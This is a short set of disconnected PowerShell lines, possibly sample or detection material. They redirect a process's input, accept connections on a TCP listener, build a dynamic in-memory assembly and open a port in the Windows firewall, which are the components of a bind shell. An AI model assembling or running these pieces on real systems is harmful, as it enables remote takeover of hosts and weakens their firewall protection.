$p = New-Object System.Diagnostics.Process
$p.StartInfo.RedirectStandardInput = $true
$l = New-Object System.Net.Sockets.TcpListener $endpoint
$c = $l.AcceptTcpClient()
$a = $domain.DefineDynamicAssembly($name, $access)
$m = $a.DefineDynamicModule('test')
$fw.LocalPolicy.CurrentProfile.GloballyOpenPorts.Add($port)
